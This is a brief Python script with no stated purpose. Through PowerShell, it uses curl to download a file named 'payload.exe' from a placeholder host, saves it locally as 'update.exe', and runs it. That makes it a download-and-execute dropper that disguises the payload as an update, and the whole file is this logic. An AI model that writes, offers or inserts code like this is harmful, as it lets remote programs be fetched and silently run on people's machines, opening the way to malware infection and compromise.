import os
import subprocess

output_file = os.path.join(os.getcwd(), "update.exe")
download_command = f'curl.exe -L https://example.invalid/payload.exe -o "{output_file}"'
subprocess.run(["powershell", "-Command", download_command])
launch_command = f'Start-Process "{output_file}" -NoNewWindow -Wait'
subprocess.run(["powershell", "-Command", launch_command])
